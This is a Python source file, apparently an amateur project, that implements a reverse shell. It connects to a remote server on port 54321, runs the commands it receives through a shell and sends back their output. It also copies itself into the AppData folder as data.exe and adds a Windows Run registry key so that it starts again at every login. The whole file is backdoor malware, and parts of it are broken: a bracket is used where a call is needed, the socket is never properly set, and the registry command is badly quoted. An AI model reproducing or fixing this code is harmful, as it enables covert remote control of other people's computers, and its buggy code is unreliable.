import socket
import subprocess
import json
import time
import os
import shutil
import sys

# for persistance:
    # go to the registry on windows
    # create a registry key on the user for the reverse.exe

class Reverse_Shell:
    global sock
    global command

    # declaration of the socket
    # see documentation

    def reliable_send(self, data):
        json_data = json.dumps(data)
        sock.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + sock.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def initialisation(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connection(self):
        while True:
            time.sleep(20)
            try:
                # connection to the server
                ipaddress = ""
                sock.connect((ipaddress, 54321))
                self.execute_command()
            except:
                self.connection()

    def execute_command(self):
        while True:
            command = self.reliable_receive()
            if command == "q":
                break
            else:
                try:
                    # creation of the command, see documentation
                    proc = subprocess.Popen(
                        command,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE
                    )
                    result = proc.stdout.read() + proc.stderr.read()
                    self.reliable_send(result)
                except:
                    self.reliable_send("Can't execute the command")

    def copy_executable(self):
        location = os.environ["appdata"] + "\\data.exe"
        if not os.path.exists[location]:
            shutil.copyfile(sys.executable, location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v data /t REG_SZ /d ""'
                        + location + '"', shell=True)


    def end_connection(self):
        # close the socket
        sock.close()

    def main(self):
        self.initialisation()
        self.copy_executable()
        self.connection()
        self.end_connection()
